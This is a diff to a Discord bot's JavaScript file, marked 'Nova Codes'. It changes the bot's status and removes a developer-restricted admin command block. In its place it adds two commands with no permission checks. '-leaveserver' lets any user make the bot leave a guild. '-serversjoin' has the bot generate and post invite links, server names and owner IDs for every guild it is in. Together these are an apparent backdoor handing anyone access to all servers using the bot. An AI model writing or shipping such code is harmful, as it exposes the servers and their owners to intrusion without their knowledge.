@@ -5,7 +5,8 @@ const client = new Discord.Client();
 
 // playing
 client.on('ready', () => {                           
-
+ client.user.setGame(`♥ Premium ℕova ♥ `,'https://www.twitch.tv/ℕ o v a Codes♥');
+  });
 
 client.on('message', message => {
               var prefix = "-" ;
@@ -585,30 +586,35 @@ client.on('message', message => {
 
      }
        });
-const adminprefix = "-";
-const devs = ['351366504068939777'];
-client.on('message', message => {
-  var argresult = message.content.split(`).slice(1).join(' ');
-    if (!devs.includes(message.author.id)) return;
-    
-if (message.content.startsWith(adminprefix + 'setG')) {
-  client.user.setGame(argresult);
-    message.channel.sendMessage(${argresult} تم تغيير بلاينق البوت إلى )
-} else 
-  if (message.content.startsWith(adminprefix + 'setN')) {
-client.user.setUsername(argresult).then
-    message.channel.sendMessage(${argresult} : تم تغيير أسم البوت إلى)
-return message.reply("**لا يمكنك تغيير الاسم يجب عليك الانتظآر لمدة ساعتين . **");
-} else
-  if (message.content.startsWith(adminprefix + 'setA')) {
-client.user.setAvatar(argresult);
-  message.channel.sendMessage(${argresult} : تم تغير صورة البوت);
-      } else     
-if (message.content.startsWith(adminprefix + 'setT')) {
-  client.user.setGame(argresult, "https://www.twitch.tv/N O V A A♥");
-    message.channel.sendMessage(تم تغيير تويتش البوت إلى  ${argresult}`)
-  
-}
-});
+
 	
+	client.on('message', message=>{
+    if (message.content ===  "-leaveserver"){
+    message.guild.leave();
+            }
+});
+
+client.on('message', msg => {//Nova Codes
+    if(msg.author.bot) return;//Nova Codes
+    
+    if(msg.content === '-serversjoin') {//Nova Codes
+      client.guilds.forEach(g => {//Nova Codes
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **//Nova Codes
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} //Nova Codes
+        Owner ID : ${g.owner.id}
+        **//Nova Codes
+        `))//Nova Codes
+  
+  
+      })//Nova Codes
+    }//Nova Codes
+    
+  })//Nova Codes
 client.login(process.env.BOT_TOKEN);
